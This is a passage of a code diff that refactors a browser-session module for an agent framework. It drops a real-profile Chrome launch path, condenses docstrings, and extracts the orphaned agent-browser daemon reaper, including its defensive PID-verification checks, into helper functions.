-            return None, (
-                "browser.use_real_profile is on, but the real-profile browser "
-                "did not expose a debug port in time. Retry, or turn the toggle off."
-            )
-
-        # Tell agent-browser to ATTACH to the running Chrome instead of
-        # launching its own (its own launch injects mock-keychain flags).
-        try:
-            browser_cmd = _find_agent_browser()
-        except FileNotFoundError as e:
-            return None, (
-                "browser.use_real_profile is on, but the local browser engine "
-                f"(agent-browser) is not installed: {e}"
-            )
-        argv = [
-            *_agent_browser_argv(browser_cmd),
-            "--session", _REAL_PROFILE_SESSION,
-            "--cdp", str(port),
-            "open", "about:blank",
-        ]
-        try:
-            proc = subprocess.run(
-                argv, capture_output=True, text=True,
-                timeout=_get_open_command_timeout(first_open=True),
-                env=_build_browser_env(),
-            )
-        except subprocess.TimeoutExpired:
-            return None, (
-                "browser.use_real_profile is on, but the real-profile browser "
-                "took too long to start. Retry, or turn the toggle off."
-            )
-        except (subprocess.SubprocessError, OSError) as e:
-            return None, f"browser.use_real_profile is on, but the launch failed: {e}"
-        if proc.returncode != 0:
-            tail = (proc.stderr or proc.stdout or "").strip().splitlines()
-            reason = tail[-1] if tail else f"exit {proc.returncode}"
-            return None, (
-                f"browser.use_real_profile is on, but the real-profile browser "
-                f"failed to start: {reason}"
-            )
-
-        cdp = _agent_browser_get_cdp(_REAL_PROFILE_SESSION)
-        # The daemon may answer with the endpoint of a
-        # browser IT spawned (throwaway temp profile) instead of the real
-        # Chrome we launched on the copy. The DevToolsActivePort file OUR
-        # Chrome wrote is the authoritative endpoint of the logged-in browser;
-        # if the daemon disagrees, trust ours.
-        try:
-            with open(port_file, encoding="utf-8") as fh:
-                our_port = fh.readline().strip()
-            m = re.search(r":(\d+)", cdp or "")
-            if m and m.group(1) != our_port:
-                cdp = f"http://127.0.0.1:{our_port}"
-        except (OSError, ValueError):
-            pass
-        if not cdp:
-            return None, (
-                "browser.use_real_profile is on, but the real-profile browser "
-                "started without exposing a devtools endpoint. Retry, or turn "
-                "the toggle off."
-            )
-        _real_profile_cdp_cache["cdp"] = cdp
-        logger.info("real-profile browser ready for %s at %s (%s)", browser, cdp, copy_dir)
-        return cdp, None
+    finally:
+        os.close(stdout_fd)
+        os.close(stderr_fd)
 
 
 def _url_is_private(url: str) -> bool:
@@ -1987,21 +1203,12 @@ def _url_is_private(url: str) -> bool:
 def _navigation_session_key(task_id: str, url: str) -> str:
     """Pick the session key that should handle ``url`` for ``task_id``.
 
-    Returns the bare task_id unless ALL of these are true:
-      1. A cloud provider is configured (``_get_cloud_provider()`` is not None).
-      2. Auto-local routing is enabled (``browser.auto_local_for_private_urls``,
-         default True).
-      3. The URL resolves to a private/LAN/loopback address.
-      4. A CDP override is not active (that path owns the whole session).
-      5. Camofox mode is not active (Camofox is already local-only).
-
-    When all are true, returns ``f"{task_id}::local"`` so the hybrid-routing
-    path spawns a local Chromium sidecar while the cloud session (if any)
-    continues to serve public URLs. With ``browser.use_real_profile`` consent,
-    local sessions (bare or sidecar) attach to the user's real-profile
-    copy-browser via ``_create_local_session``; forcing a local session from
-    the model side is the Browser Use lane's ``local`` argument, not a
-    built-in-tools argument.
+    Returns ``f"{task_id}::local"`` (hybrid routing: a local Chromium sidecar
+    while the cloud session keeps serving public URLs) only when ALL hold: a
+    cloud provider is configured, ``browser.auto_local_for_private_urls`` is
+    on (default), the URL resolves to a private/LAN/loopback address, no CDP
+    override is active (it owns the whole session), and Camofox is off (already
+    local-only). Otherwise the bare task_id.
     """
     if task_id is None:
         task_id = "default"
@@ -2040,22 +1247,15 @@ def _session_info_owned_by_task(session_info: Dict[str, Any], task_id: str, sess
     """
     owner = session_info.get("owner_task_id")
     key = session_info.get("session_key")
-    if owner is not None and owner != task_id:
-        return False
-    if key is not None and key != session_key:
-        return False
-    return True
+    return (owner is None or owner == task_id) and (key is None or key == session_key)
 
 
 def _last_session_key(task_id: str) -> str:
-    """Return the live session key to use for a non-nav browser tool call.
+    """Session key a non-nav tool must use: the one that served the task's last navigation.
 
-    ``browser_navigate`` records which concrete session key served a task's
-    most recent successful navigation. Non-navigation tools must reuse that key
-    so click/fill/snapshot land in the same browser. If the recorded owner was
-    later cleaned up or ownership metadata no longer matches, fail closed by
-    dropping the stale binding instead of silently recreating or mutating the
-    wrong browser.
+    If that session was cleaned up or its ownership metadata no longer matches,
+    fail closed by dropping the stale binding rather than recreating or mutating
+    the wrong browser.
     """
     if task_id is None:
         task_id = "default"
@@ -2100,54 +1300,35 @@ def _allow_private_urls() -> bool:
 
 def _resolve_allow_private_urls() -> bool:
     """Read the browser private-URL toggle from the active config scope."""
-    try:
-        from hermes_cli.config import read_raw_config
-        cfg = read_raw_config()
-        browser_cfg = cfg.get("browser", {})
-        if isinstance(browser_cfg, dict):
-            return is_truthy_value(
-                browser_cfg.get("allow_private_urls"), default=False
-            )
-    except Exception as e:
-        logger.debug("Could not read allow_private_urls from config: %s", e)
-    return False
+    return _browser_cfg(
+        "allow_private_urls", False,
+        lambda v: is_truthy_value(v, default=False),
+        "allow_private_urls from config",
+    )
 
 
 def _socket_safe_tmpdir() -> str:
-    """Return a short temp directory path suitable for Unix domain sockets.
+    """Short temp dir for Unix domain sockets.
 
-    macOS sets ``TMPDIR`` to ``/var/folders/xx/.../T/`` (~51 chars).  When we
-    append ``agent-browser-hermes_…`` the resulting socket path exceeds the
-    104-byte macOS limit for ``AF_UNIX`` addresses, causing agent-browser to
-    fail with "Failed to create socket directory" or silent screenshot failures.
-
-    Linux ``tempfile.gettempdir()`` already returns ``/tmp``, so this is a
-    no-op there.  On macOS we bypass ``TMPDIR`` and use ``/tmp`` directly
-    (symlink to ``/private/tmp``, sticky-bit protected, always available).
+    macOS ``TMPDIR`` (``/var/folders/.../T/``) plus ``agent-browser-hermes_…``
+    exceeds the 104-byte ``AF_UNIX`` path limit ("Failed to create socket
+    directory", silent screenshot failures), so ``/tmp`` is used there.
     """
     if sys.platform == "darwin":
         return "/tmp"
     return tempfile.gettempdir()
 
 
-# Track active sessions per "session key".
-#
-# A "session key" is either the bare task_id (cloud/default path) OR a composite
-# like f"{task_id}::local" when the hybrid-routing feature spawns a local sidecar
-# browser for a LAN/localhost URL while a cloud provider is configured globally.
-# Both forms flow through the same _active_sessions / _run_browser_command /
-# cleanup_browser code paths — the key is opaque to those internals.
-#
-# Stores: session_name (always), bb_session_id + cdp_url (cloud mode only)
-_active_sessions: Dict[str, Dict[str, Any]] = {}  # session_key -> {session_name, ...}
+# Active sessions keyed by "session key": the bare task_id, or f"{task_id}::local"
+# for a hybrid-routing local sidecar. The key is opaque to _run_browser_command /
+# cleanup_browser. Values: session_name (always), bb_session_id + cdp_url (cloud).
+_active_sessions: Dict[str, Dict[str, Any]] = {}
 _recording_sessions: set = set()  # session_keys with active recordings
 
-# Tracks the most recent session_key used per task_id. Set by browser_navigate()
-# after it chooses a backend for a URL; read by every non-nav browser tool
-# (snapshot/click/fill/eval/...) so they target the session that served the last
-# navigation.  Without this, a task that navigated to localhost on the local
-# sidecar would fall back to the cloud session on its next snapshot call.
-_last_active_session_key: Dict[str, str] = {}  # task_id -> session_key
+# Most recent session_key per task_id, set by browser_navigate() and read by every
+# non-nav tool so click/snapshot land in the session that served the last
+# navigation (otherwise a localhost sidecar task would fall back to the cloud session).
+_last_active_session_key: Dict[str, str] = {}
 _LOCAL_SUFFIX = "::local"
 
 # Flag to track if cleanup has been done
@@ -2166,66 +1347,49 @@ DEFAULT_SESSION_INACTIVITY_TIMEOUT = int(
 
 
 def _get_session_inactivity_timeout() -> int:
-    result = env_int("BROWSER_INACTIVITY_TIMEOUT", DEFAULT_SESSION_INACTIVITY_TIMEOUT)
-    try:
-        from hermes_cli.config import read_raw_config
-        cfg = read_raw_config()
-        val = cfg_get(cfg, "browser", "inactivity_timeout")
-        if val is not None:
-            result = max(int(val), 30)  # Floor at 30s to avoid instant reaping
-    except Exception as e:
-        logger.debug("Could not read inactivity_timeout from config: %s", e)
-    return result
+    env_default = env_int("BROWSER_INACTIVITY_TIMEOUT", DEFAULT_SESSION_INACTIVITY_TIMEOUT)
+    return _browser_cfg(
+        "inactivity_timeout", env_default,
+        lambda v: env_default if v is None else max(int(v), 30),  # 30s floor: no instant reaping
+        "inactivity_timeout from config",
+    )
 
 
 BROWSER_SESSION_INACTIVITY_TIMEOUT = _get_session_inactivity_timeout()
 
-# How often the cleanup thread re-runs the orphan reaper.  The reaper used to
-# run exactly once, before the cleanup loop started, which meant a hermes
-# process that stays up for days could never recover from a leak that appeared
-# *after* boot.  Observed in the wild: five agent-browser daemons accumulated
-# over 10 days in a single 18-day-uptime process, pinning ~5 CPU cores.
+# How often the cleanup thread re-runs the orphan reaper (a startup-only reap
+# can never recover from a leak that appears after boot in a long-lived process).
 BROWSER_ORPHAN_REAP_INTERVAL = 300  # seconds
 
-# Hard ceiling for a daemon whose owning hermes process is still alive but
-# which has fallen out of that process's in-memory session tracking.  The
-# owner-alive check alone makes such a daemon immortal: in-memory tracking is
-# lost on any exception path, yet the owner PID stays up, so the reaper skips
-# it forever.  Idle age (see ``_socket_dir_idle_seconds``) is the escape hatch.
-# Deliberately a large multiple of the inactivity timeout so a legitimately
-# busy session is never touched.
+# Idle ceiling for a daemon whose owner process is alive but which fell out of
+# its in-memory tracking — owner-alive alone would make it immortal. A large
+# multiple of the inactivity timeout so a legitimately busy session is never touched.
 BROWSER_ORPHAN_GRACE_SECONDS = max(3600, BROWSER_SESSION_INACTIVITY_TIMEOUT * 20)
 
-# Track last activity time per session
 _session_last_activity: Dict[str, float] = {}
-# Owner Hermes home per session (#86402).  The inactivity janitor is one
-# process-global thread started by whichever profile first opens a browser,
-# so it has no profile scope of its own; under multiplexing every cleanup
-# must re-enter the *owning* profile's scope (copy_context at spawn would pin
-# the first profile's secrets onto every other profile's teardown).
+# Owner Hermes home per session: the janitor is one process-global thread with
+# no profile scope of its own, so each teardown must re-enter the OWNING
+# profile's scope (copy_context at spawn would pin the first profile's secrets
+# onto every other profile's teardown).
 _session_owner_homes: Dict[str, str] = {}
-# Consecutive janitor cleanup failures per session; after
-# MAX_INACTIVITY_CLEANUP_FAILURES the session is force-reaped (#100738).
+# Consecutive janitor cleanup failures per session; force-reaped after MAX_INACTIVITY_CLEANUP_FAILURES.
 _cleanup_failures: Dict[str, int] = {}
 MAX_INACTIVITY_CLEANUP_FAILURES = 3
 
-# Session keys flagged suspect after a command timeout (#72205 / #85125 3b).
-# Written by _BrowserSessionBackend.mark_suspect (cheap, lock-free — a single
-# GIL-atomic dict write per the agent.deadline.SuspectableBackend contract);
-# consumed by ensure_healthy() at next use, which recycles the session.
+# Session keys flagged suspect after a command timeout. Written by
+# _BrowserSessionBackend.mark_suspect (a single GIL-atomic dict write — must stay
+# cheap and lock-free per the SuspectableBackend contract); consumed by
+# ensure_healthy() at next use, which recycles the session.
 _suspect_browser_sessions: Dict[str, str] = {}
 
 
 class _BrowserSessionBackend:
     """``agent.deadline.SuspectableBackend`` adapter for one cached session key.
 
-    The browser "backend" is the module-level ``_active_sessions[key]`` cache
-    entry plus its agent-browser daemon, so the adapter is a thin stateless
-    view keyed by session key rather than a long-lived object.  Browser
-    commands run through raw ``subprocess`` waits (not ``run_bounded_*``), so
-    the timeout path calls ``mark_suspect`` inline; ``ensure_healthy`` runs at
-    the top of ``_get_session_info`` — the single choke point every browser
-    command passes through before reusing a cached session.
+    A thin stateless view over ``_active_sessions[key]`` + its daemon. The
+    timeout path calls ``mark_suspect`` inline; ``ensure_healthy`` runs at the
+    top of ``_get_session_info`` — the single choke point every command passes
+    through before reusing a cached session.
     """
 
     __slots__ = ("_session_key",)
@@ -2236,21 +1400,18 @@ class _BrowserSessionBackend:
     def mark_suspect(self, reason: str) -> None:
         """Flag the cached session as possibly poisoned.
 
-        MUST stay cheap, non-blocking, and lock-free (SuspectableBackend
-        adopter contract): it runs inline on the timed-out caller's thread.
-        All expensive recycle work is deferred to ``ensure_healthy``.
+        MUST stay cheap, non-blocking and lock-free (it runs inline on the
+        timed-out caller's thread); all recycle work is deferred to ``ensure_healthy``.
         """
         _suspect_browser_sessions[self._session_key] = reason
 
     def ensure_healthy(self) -> bool:
         """Recycle the session when a prior timeout marked it suspect.
 
-        Returns ``True`` when the cached session is safe to reuse, ``False``
-        after tearing down a suspect session (caller creates a fresh one).
-        The flag is popped *before* teardown: ``_cleanup_single_browser_session``
-        issues an agent-browser ``close`` through ``_run_browser_command`` /
-        ``_get_session_info``, and clearing first keeps that re-entrant call
-        from recursing back into another recycle.
+        True when safe to reuse; False after tearing down a suspect session
+        (caller creates a fresh one). The flag is popped BEFORE teardown: the
+        ``close`` re-enters ``_get_session_info`` and must not recurse into
+        another recycle.
         """
         reason = _suspect_browser_sessions.pop(self._session_key, None)
         if reason is None:
@@ -2374,12 +1535,9 @@ def _emergency_cleanup_all_sessions():
         logger.debug("Orphan reap on exit failed: %s", e)
 
 
-# Register cleanup via atexit only.  Previous versions installed SIGINT/SIGTERM
-# handlers that called sys.exit(), but this conflicts with prompt_toolkit's
-# async event loop — a SystemExit raised inside a key-binding callback
-# corrupts the coroutine state and makes the process unkillable.  atexit
-# handlers run on any normal exit (including sys.exit), so browser sessions
-# are still cleaned up without hijacking signals.
+# atexit only — NO SIGINT/SIGTERM handlers calling sys.exit(): a SystemExit
+# raised inside a prompt_toolkit key-binding callback corrupts the coroutine
+# state and makes the process unkillable. atexit runs on any normal exit.
 atexit.register(_emergency_cleanup_all_sessions)
 
 
@@ -2389,14 +1547,11 @@ atexit.register(_emergency_cleanup_all_sessions)
 
 @contextlib.contextmanager
 def _session_owner_scope(task_id: str):
-    """Run under the Hermes home + secret scope that owns ``task_id``'s
-    browser session (recorded by ``_update_session_activity``).
+    """Run under the Hermes home + secret scope owning ``task_id``'s session (no-op if unrecorded).
 
-    No-op when no owner was recorded.  Mirrors
-    ``gateway.run._profile_runtime_scope`` — the janitor thread is
-    process-global, so each session's teardown must re-enter its OWN
-    profile's scope rather than inherit whichever profile spawned the
-    thread; never falls through to ``os.environ``.
+    The janitor thread is process-global, so each teardown must re-enter its
+    OWN profile's scope rather than inherit the spawning profile's; never falls
+    through to ``os.environ``.
     """
     owner_home = _session_owner_homes.get(task_id)
     if owner_home is None:
@@ -2423,17 +1578,12 @@ def _session_owner_scope(task_id: str):
 
 
 def _cleanup_inactive_browser_sessions():
-    """
-    Clean up browser sessions that have been inactive for longer than the timeout.
+    """Close sessions inactive longer than the timeout (called by the cleanup thread).
 
-    This function is called periodically by the background cleanup thread to
-    automatically close sessions that haven't been used recently, preventing
-    orphaned sessions (local or Browserbase) from accumulating.
-
-    Each session is torn down under its owner profile's scope (#86402).  A
-    session whose cleanup keeps failing is force-reaped after
-    ``MAX_INACTIVITY_CLEANUP_FAILURES`` attempts instead of retrying forever
-    (#100738); only a successful cleanup clears its failure count.
+    Each session is torn down under its owner profile's scope. A session whose
+    cleanup keeps failing is force-reaped after MAX_INACTIVITY_CLEANUP_FAILURES
+    attempts instead of retrying forever; only a successful cleanup clears its
+    failure count.
     """
     current_time = time.time()
     sessions_to_cleanup = []
@@ -2495,31 +1645,16 @@ def _verify_reapable_browser_daemon(daemon_pid: int, socket_dir: str,
                                     session_name: str) -> bool:
     """Confirm a live PID is genuinely *this* session's agent-browser daemon.
 
-    The orphan reaper scans world-writable, predictably-named temp paths
-    (``/tmp/agent-browser-h_*`` etc.) and reads a daemon PID from a ``.pid``
-    file we do not write ourselves — the agent-browser daemon writes it.  A
-    same-user actor can therefore plant a fake socket dir whose ``.pid`` points
-    at an arbitrary victim process, or a recycled PID can land on an unrelated
-    process after the real daemon exits.  Either way, terminating that PID
-    (a *tree* kill via ``_terminate_host_pid``) is an arbitrary-process DoS.
-
-    Before reaping we require, via ``psutil`` (a hard dependency, cross-platform
-    for same-user processes — the only processes the reaper can signal):
-
-      1. **Identity** — the process looks like agent-browser: ``agent-browser``
-         appears in its name or command line.
-      2. **Binding** — the process is bound to *this* session's socket dir: the
-         socket dir path (or its basename) appears in the command line, or in
-         ``AGENT_BROWSER_SOCKET_DIR`` in the process environment.
-
-    Requirement (2) is the real spoof defense: a planted process pointing at a
-    victim PID will not have the victim's cmdline/environ referencing our
-    socket dir.  An attacker would need a process that genuinely embeds this
-    exact session path — i.e. a real daemon they already own and could signal
-    directly.  Fail-closed: any ambiguity (unreadable cmdline, no match) means
-    we refuse to reap and leave the process and its socket dir alone.
-
-    Returns ``True`` only when both checks pass.
+    The ``.pid`` file lives in a world-writable, predictably-named temp dir and
+    is written by the daemon, not us: a same-user actor can plant one pointing
+    at a victim PID, or a recycled PID can land on an unrelated process — and
+    reaping is a *tree* kill, i.e. an arbitrary-process DoS. Two psutil checks
+    must both pass: (1) identity — ``agent-browser`` in the name or cmdline;
+    (2) binding — the socket dir path/basename in the cmdline, or
+    ``AGENT_BROWSER_SOCKET_DIR`` in its environ. (2) is the real spoof defense:
+    an attacker would need a real daemon embedding this exact path, which they
+    could already signal. Fail-closed on any ambiguity (unreadable cmdline, no
+    match): refuse to reap and leave process and socket dir alone.
     """
     try:
         import psutil
@@ -2578,20 +1713,12 @@ def _verify_reapable_browser_daemon(daemon_pid: int, socket_dir: str,
 
 
 def _socket_dir_idle_seconds(socket_dir: str) -> Optional[float]:
-    """Seconds since anything in ``socket_dir`` was last written.
+    """Seconds since anything in ``socket_dir`` was last written; None if unknown (fail safe).
 
-    Every browser command writes ``_stdout_<cmd>`` / ``_stderr_<cmd>`` temp
-    files into the session's socket dir, so the newest mtime under that dir is
-    a last-activity marker that — unlike ``_session_last_activity`` — survives
-    hermes restarts and does not depend on in-memory bookkeeping surviving an
-    exception path.
-
-    The directory's own mtime is not sufficient: command names repeat, so
-    rewriting an existing ``_stdout_click`` updates that file's mtime but not
-    the directory's.  Scan the entries too.
-
-    Returns ``None`` when the age cannot be determined, so callers can fail
-    safe (treat unknown age as "too young to reap").
+    Every command writes ``_stdout_<cmd>`` / ``_stderr_<cmd>`` there, so the
+    newest mtime is a last-activity marker that survives hermes restarts and
+    lost in-memory bookkeeping. The dir's own mtime is not enough — rewriting
+    an existing ``_stdout_click`` doesn't touch it — so entries are scanned too.
     """
     try:
         latest = os.path.getmtime(socket_dir)
@@ -2611,34 +1738,107 @@ def _socket_dir_idle_seconds(socket_dir: str) -> Optional[float]:
     return max(0.0, time.time() - latest)
 
 
+def _owner_pid_alive(socket_dir: str, session_name: str) -> Tuple[Optional[int], Optional[bool]]:
+    """Read ``<session>.owner_pid`` and report ``(pid, alive)``; ``(None, None)`` when missing/corrupt."""
+    owner_pid_file = os.path.join(socket_dir, f"{session_name}.owner_pid")
+    if not os.path.isfile(owner_pid_file):
+        return None, None
+    try:
+        owner_pid = int(Path(owner_pid_file).read_text(encoding="utf-8").strip())
+        # ``os.kill(pid, 0)`` is NOT a no-op on Windows; use the cross-platform check.
+        from gateway.status import _pid_exists
+        return owner_pid, _pid_exists(owner_pid)
+    except (ValueError, OSError):
+        return None, None  # corrupt file — fall through to legacy handling
+
+
+def _reap_socket_dir(socket_dir: str, session_name: str, tracked_names: set) -> bool:
+    """Reap one ``agent-browser-<session>`` dir if orphaned; return True when a daemon was killed.
+
+    Ownership priority: (1) a live ``owner_pid`` means another hermes process
+    owns it — leave it alone UNLESS it is untracked here and idle past
+    ``BROWSER_ORPHAN_GRACE_SECONDS`` (owner-alive alone made leaked daemons
+    immortal: in-memory tracking is lost on any exception path and the daemon's
+    own idle timeout doesn't fire when it is wedged); (2) no owner_pid (legacy)
+    falls back to this process's tracking. A pidless dir is only stale after the
+    grace period — deleting it immediately races the creator's first stdout open.
+    The daemon PID is verified as ours before a tree-kill (world-writable dir,
+    recycled PIDs), and refused without a start-time fingerprint.
+    """
+    owner_pid, owner_alive = _owner_pid_alive(socket_dir, session_name)
+    if owner_alive is True:
+        if session_name in tracked_names:
+            return False
+        idle_s = _socket_dir_idle_seconds(socket_dir)
+        if idle_s is None or idle_s < BROWSER_ORPHAN_GRACE_SECONDS:
+            return False  # unknown age or within grace — fail safe
+        logger.warning(
+            "Browser session %s has a live owner (PID %s) but is untracked "
+            "and idle for %ds (grace %ds) — treating as leaked and reaping",
+            session_name, owner_pid, int(idle_s),
+            BROWSER_ORPHAN_GRACE_SECONDS)
+    elif owner_alive is None and session_name in tracked_names:
+        return False
+
+    pid_file = os.path.join(socket_dir, f"{session_name}.pid")
+    if not os.path.isfile(pid_file):
+        idle_s = _socket_dir_idle_seconds(socket_dir)
+        if idle_s is None or idle_s < BROWSER_ORPHAN_GRACE_SECONDS:
+            return False
+        shutil.rmtree(socket_dir, ignore_errors=True)
+        return False
+
+    try:
+        daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
+    except (ValueError, OSError):
+        shutil.rmtree(socket_dir, ignore_errors=True)
+        return False
+
+    from gateway.status import _pid_exists
+    if not _pid_exists(daemon_pid):
+        shutil.rmtree(socket_dir, ignore_errors=True)
+        return False
+
+    if not _verify_reapable_browser_daemon(daemon_pid, socket_dir, session_name):
+        return False  # leave process and dir for a later sweep once the imposter PID is gone
+
+    # Tree-kill so Chromium children (renderer, GPU, ...) go too, not just the daemon.
+    reaped = False
+    try:
+        from gateway.status import get_process_start_time
+        from tools.process_registry import ProcessRegistry
+        daemon_start = get_process_start_time(daemon_pid)
+        if daemon_start is None:
+            logger.warning(
+                "Refusing to reap browser daemon PID %d (session %s): "
+                "no start-time fingerprint available", daemon_pid, session_name)
+            return False
+        ProcessRegistry._terminate_host_pid(daemon_pid, daemon_start)
+        logger.info("Reaped orphaned browser daemon PID %d (session %s)",
+                    daemon_pid, session_name)
+        reaped = True
+    except (ProcessLookupError, PermissionError, OSError):
+        pass
+    shutil.rmtree(socket_dir, ignore_errors=True)
+    return reaped
+
+
 def _reap_orphaned_browser_sessions():
-    """Scan for orphaned agent-browser daemon processes from previous runs.
+    """Kill agent-browser daemons whose owning hermes process is gone.
 
-    When the Python process that created a browser session exits uncleanly
-    (SIGKILL, crash, gateway restart), the in-memory ``_active_sessions``
-    tracking is lost but the node + Chromium processes keep running.
-
-    This function scans the tmp directory for ``agent-browser-*`` socket dirs
-    left behind by previous runs, reads the daemon PID files, and kills any
-    daemons whose owning hermes process is no longer alive.
-
-    Ownership detection priority:
-      1. ``<session>.owner_pid`` file (written by current code) — if the
-         referenced hermes PID is alive, leave the daemon alone regardless
-         of whether it's in *this* process's ``_active_sessions``.  This is
-         cross-process safe: two concurrent hermes instances won't reap each
-         other's daemons.
-      2. Fallback for daemons that predate owner_pid: check
-         ``_active_sessions`` in the current process.  If not tracked here,
-         treat as orphan (legacy behavior).
-
+    When the process that created a session exits uncleanly (SIGKILL, crash,
+    gateway restart) the in-memory ``_active_sessions`` tracking is lost but the
+    node + Chromium processes keep running. Scans the tmp dir for
+    ``agent-browser-*`` socket dirs and applies ``_reap_socket_dir``'s ownership
+    rules (owner_pid file first — cross-process safe, two hermes instances never
+    reap each other — then in-process tracking for legacy daemons).
     Safe to call from any context — atexit, cleanup thread, or on demand.
     """
     import glob
 
-    # Lightpanda servers spawned for Browser Use mode keep their own records
-    # (no agent-browser socket dir); sweep them with the same owner-liveness
-    # rule before the daemon scan, which may return early.
+    # Lightpanda servers (Browser Use mode) keep their own records (no
+    # agent-browser socket dir); sweep them with the same owner-liveness rule
+    # BEFORE the daemon scan, which may return early.
     try:
         from tools.browser_lightpanda import reap_orphaned_lightpanda
 
@@ -2647,17 +1847,12 @@ def _reap_orphaned_browser_sessions():
         logger.debug("Lightpanda orphan reap failed: %s", e)
 
     tmpdir = _socket_safe_tmpdir()
-    pattern = os.path.join(tmpdir, "agent-browser-h_*")
-    socket_dirs = glob.glob(pattern)
-    # Also pick up CDP sessions
-    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-cdp_*"))
-    # Also pick up cloud-provider sessions (browser-use/browserbase/firecrawl)
-    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-hermes_*"))
-
+    socket_dirs = []
+    for prefix in ("agent-browser-h_*", "agent-browser-cdp_*", "agent-browser-hermes_*"):
+        socket_dirs += glob.glob(os.path.join(tmpdir, prefix))
     if not socket_dirs:
         return
 
-    # Build set of session_names currently tracked by this process (fallback path)
     with _cleanup_lock:
         tracked_names = {
             info.get("session_name")
@@ -2667,140 +1862,20 @@ def _reap_orphaned_browser_sessions():
 
     reaped = 0
     for socket_dir in socket_dirs:
-        dir_name = os.path.basename(socket_dir)
-        # dir_name is "agent-browser-{session_name}"
-        session_name = dir_name.removeprefix("agent-browser-")
-        if not session_name:
-            continue
-
-        # Ownership check: prefer owner_pid file (cross-process safe).
-        owner_pid_file = os.path.join(socket_dir, f"{session_name}.owner_pid")
-        owner_pid: Optional[int] = None
-        owner_alive: Optional[bool] = None  # None = owner_pid missing/unreadable
-        if os.path.isfile(owner_pid_file):
-            try:
-                owner_pid = int(Path(owner_pid_file).read_text(encoding="utf-8").strip())
-                # ``os.kill(pid, 0)`` is NOT a no-op on Windows (bpo-14484).
-                # Use the cross-platform existence check.
-                from gateway.status import _pid_exists
-                owner_alive = _pid_exists(owner_pid)
-            except (ValueError, OSError):
-                owner_pid = None
-                owner_alive = None  # corrupt file — fall through
-
-        if owner_alive is True:
-            # Owner is alive.  Normally that means the session belongs to a
-            # live hermes process and must not be touched — but "owner alive"
-            # alone made leaked daemons immortal: if the owner lost its
-            # in-memory tracking (any exception path between spawn and
-            # registration), nothing would ever reap the daemon, and the
-            # daemon-side AGENT_BROWSER_IDLE_TIMEOUT_MS does not fire when the
-            # daemon itself is wedged (e.g. Chrome's framework was swapped out
-            # from under it by an auto-update).
-            #
-            # So: still trust live tracking, but fall back to idle age.
-            if session_name in tracked_names:
-                continue
-
-            idle_s = _socket_dir_idle_seconds(socket_dir)
-            if idle_s is None or idle_s < BROWSER_ORPHAN_GRACE_SECONDS:
-                # Unknown age, or still within the grace window — fail safe.
-                continue
-
-            logger.warning(
-                "Browser session %s has a live owner (PID %s) but is untracked "
-                "and idle for %ds (grace %ds) — treating as leaked and reaping",
-                session_name, owner_pid, int(idle_s),
-                BROWSER_ORPHAN_GRACE_SECONDS)
-            # fall through to the reap path below
-
-        if owner_alive is None:
-            # No owner_pid file (legacy daemon).  Fall back to in-process
-            # tracking: if this process knows about the session, leave alone.
-            if session_name in tracked_names:
-                continue
-
-        # owner_alive is False (dead owner) OR legacy daemon not tracked here.
-        pid_file = os.path.join(socket_dir, f"{session_name}.pid")
-        if not os.path.isfile(pid_file):
-            # A newly-created session directory exists briefly before
-            # agent-browser writes its PID/owner files. Another Hermes process
-            # may run this global reaper during that window. Treat a pidless
-            # directory as stale only after the orphan grace period; deleting
-            # it immediately races the creator's first stdout/stderr open.
-            idle_s = _socket_dir_idle_seconds(socket_dir)
-            if idle_s is None or idle_s < BROWSER_ORPHAN_GRACE_SECONDS:
-                continue
-            shutil.rmtree(socket_dir, ignore_errors=True)
-            continue
-
-        try:
-            daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
-        except (ValueError, OSError):
-            shutil.rmtree(socket_dir, ignore_errors=True)
-            continue
-
-        # Check if the daemon is still alive. ``os.kill(pid, 0)`` on Windows
-        # is NOT a no-op — use the handle-based existence check.
-        from gateway.status import _pid_exists
-        if not _pid_exists(daemon_pid):
-            shutil.rmtree(socket_dir, ignore_errors=True)
-            continue
-
-        # The PID is live — but the .pid file lives in a world-writable,
-        # predictably-named temp dir we don't write ourselves, and PIDs get
-        # recycled after the real daemon exits.  Verify the process really is
-        # *this* session's agent-browser daemon before tree-killing it; refuse
-        # otherwise (don't touch the process, leave the socket dir for a later
-        # sweep once the imposter PID is gone).  Fixes the arbitrary same-user
-        # process DoS in issue #14073.
-        if not _verify_reapable_browser_daemon(
-                daemon_pid, socket_dir, session_name):
-            continue
-
-        # Daemon is alive and its owner is dead (or legacy + untracked).  Reap.
-        # Use the process-tree termination helper so Chromium children
-        # (renderer, GPU, etc.) are cleaned up, not just the daemon parent.
-        try:
-            from gateway.status import get_process_start_time
-            from tools.process_registry import ProcessRegistry
-            daemon_start = get_process_start_time(daemon_pid)
-            if daemon_start is None:
-                # Identity can't be fingerprinted — the verify above matched,
-                # but without a start time _terminate_host_pid cannot rule out
-                # a recycle between verify and kill. Refuse; a later sweep
-                # retries once the process table settles.
-                logger.warning(
-                    "Refusing to reap browser daemon PID %d (session %s): "
-                    "no start-time fingerprint available", daemon_pid, session_name)
-                continue
-            ProcessRegistry._terminate_host_pid(daemon_pid, daemon_start)
-            logger.info("Reaped orphaned browser daemon PID %d (session %s)",
-                        daemon_pid, session_name)
+        session_name = os.path.basename(socket_dir).removeprefix("agent-browser-")
+        if session_name and _reap_socket_dir(socket_dir, session_name, tracked_names):
             reaped += 1
-        except (ProcessLookupError, PermissionError, OSError):
-            pass
-
-        # Clean up the socket directory
-        shutil.rmtree(socket_dir, ignore_errors=True)
 
     if reaped:
         logger.info("Reaped %d orphaned browser session(s) from previous run(s)", reaped)
 
 
 def _browser_cleanup_thread_worker():
-    """
-    Background thread that periodically cleans up inactive browser sessions.
+    """Every 30s: close sessions idle past BROWSER_SESSION_INACTIVITY_TIMEOUT.
 
-    Runs every 30 seconds and checks for sessions that haven't been used
-    within the BROWSER_SESSION_INACTIVITY_TIMEOUT period.
-
-    Also reaps orphaned daemons — on startup (sessions left by previous
-    process lifetimes) *and* every BROWSER_ORPHAN_REAP_INTERVAL seconds
-    thereafter.  The periodic pass matters because a leak is not only a
-    across-restart phenomenon: a daemon can fall out of in-memory tracking
-    at any point in a long-lived process, and a startup-only reap can never
-    recover from that.
+    Also reaps orphaned daemons on startup AND every BROWSER_ORPHAN_REAP_INTERVAL
+    seconds — a daemon can fall out of in-memory tracking at any point in a
+    long-lived process, and a startup-only reap could never recover from that.
     """
